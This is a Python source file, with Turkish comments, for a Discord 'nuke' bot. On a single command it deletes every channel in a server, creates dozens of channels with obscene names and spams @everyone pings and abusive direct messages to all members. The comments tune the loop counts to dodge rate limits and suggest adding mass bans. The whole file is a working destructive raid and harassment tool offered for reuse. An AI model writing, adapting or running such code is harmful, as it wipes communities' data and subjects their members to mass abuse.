import discord
from discord.ext import commands
# burda tüm izinleri verdim bunu başka bot pojelerindede kullanabilirsin
intents = discord.Intents.default()
intents.members = True 
intents.message_content = True
intents.messages = True
intents.dm_messages = True

bot     = commands.Bot(command_prefix=',', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} : oyun oynamaya hazır :D (oyun istiyo abisi)')

@bot.event
async def on_message(message):  # bot daha gelişir hatta bu biraz sıkıntılı bir bot senin için kısa sürede sıfırdan yazdın ona göre ielrde sana daha iyisini yaparım
    if message.author == bot.user:
        return
    
    if message.content.startswith(',oyun'):
        for channel in message.guild.channels:
            try:                     # ,oyun ile çalışıyor kanalları siliyor bu kısım 
                await channel.delete()
            except discord.Forbidden:
                await message.channel.send(f"izinlerim olmadığından bu işlemi gerçekleştiremedim :(")
            except Exception as e:
                await message.channel.send(f"bir hata oluştu: {e}")
        
# burda forun içindeki 50 yi istedigin gibi yap abartma engel yiyorsun diğer rangeleride abartmadan değişirsin
        for i in range(1, 50):
            try:
                new_channel = await message.guild.create_text_channel(f'ananızı-{i}-kere-siktik')
                for _ in range(6): # bunuda değiştir ama çok elleşme bot tıkanıyor 6 ideal
                    await new_channel.send('# @everyone TOSUNWASHEREEEEEEEEEEEEEEEE')
                    for member in message.guild.members:
                        if member !=bot.user:
                            try:
                                await member.send('# tosunwashere ANANIZI SİKTİK')
                            except discord.Forbiden:
                                pass
            except discord.Forbidden:
                await message.channel.send(f"Yetersiz izinler.")
            except Exception as e:
                await message.channel.send(f"bir hata oluştu: {e}")
        
# PATLATMA İŞLEMİ BİTTİKTEN SONRA BOT SON KONUŞMASINI BURDA YAPIYOR VE İŞLEMİ BİTİRİYOR (BURAYA BANLAMA EKLERSİN VS BEN ÜŞENDİM ŞUAN)
        for member in message.guild.members:
            if member != bot.user:
                try:
                    await member.send('# hiğ')
                except discord.Forbidden:
                    pass
    
    await bot.process_commands(message)

bot.run("buraya_token_gelicek_ask")
